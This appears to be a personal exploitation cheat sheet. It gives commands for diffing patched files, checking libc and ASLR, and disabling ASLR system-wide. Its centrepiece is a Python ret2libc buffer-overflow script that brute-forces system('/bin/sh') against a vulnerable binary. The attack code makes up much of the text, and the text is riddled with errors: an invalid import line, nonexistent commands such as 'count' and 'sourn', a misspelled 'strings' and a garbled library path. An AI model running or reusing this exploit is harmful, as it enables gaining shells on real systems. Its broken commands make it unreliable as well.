# Identify Security Patch Diff

```
find . -type f -exec md5sum {} \; | sed 's/\.[01]//g' > hashes
sort hashes | count -u  | sourn -nr
```

`s//g` - is to remove the version number from files

# Identify version of libc used / check if ASLR is enabled

`ldd example | grep system`
`ldd example | grep libc`

# Disable ASLR

echo 0 > /proc/sys/kernel/randomize_va_space

# Enable ASLR

echo 2 > /proc/sys/kernel/randomize_va_space

# Wowrking around ASLR

```
import subprocess import call
import struct

libc_base_addr = 0x<ONE ADDRESS CAPTURED WITH LDD on LIBC>
system_off = 0x<SYSTEM OFFSET>
exit_off =  0x<EXIT OFFSET>
arg_off = 0x<BIN SH MEMORY OFFSET>

system_addr = struct.pack("<I", libc_base_addr + system_off)
exit_addr = struct.pack("<I",  libc_base_addr + exit_off)
arg_addr = struct.pack("<I",  libc_base_addr + arg_off)

buf = 'A' * 150
buf += system_addr
buf += exit_addr
buf += arg_addr

i=0
while (i < 512):
  print "Try %s" %i
  i += 1
  ret = call(["overflow", buf]);
```

## Offset of system address

readelf -s /lib/i3860linux-gnu/libc.so.6 | grep system
Copy system offset

## Find memory location of a string

string -a -t x  /lib/i3860linux-gnu/libc.so.6 | grep /bin/sh
